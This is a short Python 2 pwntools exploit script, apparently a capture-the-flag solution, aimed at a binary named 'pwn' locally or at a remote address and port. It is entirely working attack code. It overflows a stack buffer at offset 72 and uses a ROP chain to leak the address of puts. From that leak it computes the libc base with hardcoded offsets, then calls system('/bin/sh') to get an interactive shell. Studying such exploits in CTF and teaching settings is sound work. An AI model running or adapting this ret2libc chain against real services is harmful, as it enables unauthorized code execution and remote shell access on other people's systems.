#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote('111.198.29.45', 50119)
    #libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    #libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    #libc = ELF('./libc-2.xx.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

if __name__ == '__main__':
    offset = 72
    start_addr = 0x400550
    pop_rdi_ret = 0x0000000000400763
    payload = flat(['a' * offset, pop_rdi_ret, elf.got['puts'], elf.plt['puts'], start_addr]).ljust(200, '\x00')
    p.s(payload)
    puts_addr = u64(p.ru('\x7f')[-6:].ljust(8, '\x00'))
    success('puts ' + hex(puts_addr))
    libc_base = puts_addr - 0x06f690
    system_addr = libc_base + 0x045390
    bin_sh_addr = libc_base + 0x18cd57
    payload = flat(['a' * offset, pop_rdi_ret, bin_sh_addr, system_addr]).ljust(200, '\x00')
    sleep(0.01)
    p.s(payload)
    p.i()
